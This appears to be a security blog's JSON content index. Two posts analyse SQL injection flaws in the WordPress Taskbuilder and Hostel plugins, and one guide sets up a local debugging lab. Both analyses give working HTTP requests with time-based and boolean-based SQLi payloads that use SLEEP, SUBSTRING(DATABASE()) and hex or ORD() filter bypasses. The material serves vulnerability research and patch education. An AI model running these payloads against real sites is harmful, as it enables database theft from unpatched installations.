[{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( 